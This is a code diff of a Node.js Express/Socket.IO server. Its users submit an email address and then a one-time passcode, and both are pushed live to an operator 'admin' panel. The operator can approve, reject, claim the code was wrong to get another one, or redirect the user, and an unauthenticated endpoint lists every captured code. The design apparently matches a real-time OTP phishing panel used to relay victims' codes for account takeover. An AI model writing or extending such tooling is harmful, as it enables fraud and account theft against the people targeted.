@@ -4,7 +4,6 @@ const http = require('http');
 const socketIo = require('socket.io');
 const { Pool } = require('pg');
 const path = require('path');
-const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
@@ -12,17 +11,16 @@ const io = socketIo(server, {
   cors: { origin: "*" }
 });
 
-// Middleware
 app.use(express.json());
 app.use(express.static('public'));
 
-// ------------------- Neon PostgreSQL -------------------
+// Neon PostgreSQL
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: { rejectUnauthorized: false }
 });
 
-// Auto-create users table if not exists
+// Create table
 async function initDatabase() {
   const createTableQuery = `
     CREATE TABLE IF NOT EXISTS users (
@@ -33,50 +31,34 @@ async function initDatabase() {
       created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     );
   `;
-  try {
-    await pool.query(createTableQuery);
-    console.log('✅ Database ready: users table exists');
-  } catch (err) {
-    console.error('❌ DB init error:', err.message);
-  }
+  await pool.query(createTableQuery);
+  console.log('✅ Database ready');
 }
 initDatabase();
 
-// ------------------- Socket.IO -------------------
-// Store user sockets: email -> socket.id
+// Store user sockets
 const userSockets = new Map();
 
 io.on('connection', (socket) => {
-  console.log('🟢 Client connected:', socket.id);
+  console.log('Client connected:', socket.id);
 
   socket.on('user-join', (email) => {
     userSockets.set(email, socket.id);
     socket.join(`user_${email}`);
-    console.log(`📧 User ${email} joined room`);
+    console.log(`User ${email} joined`);
   });
 
   socket.on('admin-join', () => {
     socket.join('admin_room');
-    console.log('🔐 Admin joined');
+    console.log('Admin joined');
   });
 
   socket.on('disconnect', () => {
-    console.log('🔴 Client disconnected:', socket.id);
-    // Remove from map (optional cleanup)
-    for (let [email, id] of userSockets.entries()) {
-      if (id === socket.id) userSockets.delete(email);
-    }
+    console.log('Client disconnected');
   });
 });
 
-// Helper to emit to user
-function emitToUser(email, event, data) {
-  io.to(`user_${email}`).emit(event, data);
-}
-
-// ------------------- API Endpoints -------------------
-
-// 1. Submit email (user side)
+// Submit email
 app.post('/api/submit-email', async (req, res) => {
   const { email } = req.body;
   if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
@@ -84,7 +66,6 @@ app.post('/api/submit-email', async (req, res) => {
   }
 
   try {
-    // Check if user exists, if not create
     let result = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
     let userId;
 
@@ -96,11 +77,10 @@ app.post('/api/submit-email', async (req, res) => {
       userId = insert.rows[0].id;
     } else {
       userId = result.rows[0].id;
-      // Reset status to pending for this session
       await pool.query('UPDATE users SET status = $1, otp_code = NULL WHERE email = $2', ['pending', email]);
     }
 
-    // Notify admin room about new email (real-time)
+    // Notify admin
     io.to('admin_room').emit('new-email', { email, userId, timestamp: new Date() });
 
     res.json({ success: true, userId });
@@ -110,7 +90,7 @@ app.post('/api/submit-email', async (req, res) => {
   }
 });
 
-// 2. Submit OTP (user side)
+// Submit OTP
 app.post('/api/submit-otp', async (req, res) => {
   const { email, otp } = req.body;
   if (!email || !otp) return res.status(400).json({ error: 'Missing data' });
@@ -121,7 +101,6 @@ app.post('/api/submit-otp', async (req, res) => {
       [otp, 'otp_submitted', email]
     );
 
-    // Notify admin about OTP submission
     io.to('admin_room').emit('new-otp', { email, otp, timestamp: new Date() });
 
     res.json({ success: true });
@@ -131,7 +110,7 @@ app.post('/api/submit-otp', async (req, res) => {
   }
 });
 
-// 3. Get all users (for admin panel)
+// Get all users
 app.get('/api/users', async (req, res) => {
   try {
     const result = await pool.query('SELECT id, email, otp_code, status, created_at FROM users ORDER BY created_at DESC');
@@ -141,7 +120,7 @@ app.get('/api/users', async (req, res) => {
   }
 });
 
-// 4. Admin login check
+// Admin login
 app.post('/api/admin/check', (req, res) => {
   const { email, password } = req.body;
   const adminEmail = process.env.ADMIN_EMAIL;
@@ -153,69 +132,36 @@ app.post('/api/admin/check', (req, res) => {
   }
 });
 
-// 5. Admin actions
+// Admin actions
 app.post('/api/admin/approve', async (req, res) => {
   const { email } = req.body;
-  try {
-    await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['approved', email]);
-    emitToUser(email, 'approve-user', { email });
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
+  await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['approved', email]);
+  io.to(`user_${email}`).emit('approve-user', { email });
+  res.json({ success: true });
 });
 
 app.post('/api/admin/reject', async (req, res) => {
   const { email } = req.body;
-  try {
-    await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['rejected', email]);
-    emitToUser(email, 'reject-user', { email });
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
+  await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['rejected', email]);
+  io.to(`user_${email}`).emit('reject-user', { email });
+  res.json({ success: true });
 });
 
 app.post('/api/admin/incorrect-otp', async (req, res) => {
   const { email } = req.body;
-  try {
-    emitToUser(email, 'incorrect-otp', { email });
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
+  io.to(`user_${email}`).emit('incorrect-otp', { email });
+  res.json({ success: true });
 });
 
 app.post('/api/admin/redirect', async (req, res) => {
   const { email } = req.body;
-  try {
-    await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['redirected', email]);
-    emitToUser(email, 'redirect-to-sad', { email });
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
+  await pool.query('UPDATE users SET status = $1 WHERE email = $2', ['redirected', email]);
+  io.to(`user_${email}`).emit('redirect-to-sad', { email });
+  res.json({ success: true });
 });
 
-// Serve sound files (optional, ensure they exist in public/sounds/)
-app.get('/sounds/:filename', (req, res) => {
-  const filePath = path.join(__dirname, 'public', 'sounds', req.params.filename);
-  if (fs.existsSync(filePath)) {
-    res.sendFile(filePath);
-  } else {
-    res.status(404).json({ error: 'Sound not found' });
-  }
-});
-
-// Catch-all to serve index.html for any unknown routes (SPA)
-app.get('*', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-// ------------------- Start Server -------------------
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-  console.log(`🚀 Server running on http://localhost:${PORT}`);
-  console.log(`📱 User interface: http://localhost:${PORT}`);
-  console.log(`👑 Admin panel: http://localhost:${PORT}/admin.html`);
+  console.log(`Server running on http://localhost:${PORT}`);
+  console.log(`Admin: http://localhost:${PORT}/admin.html`);
 });
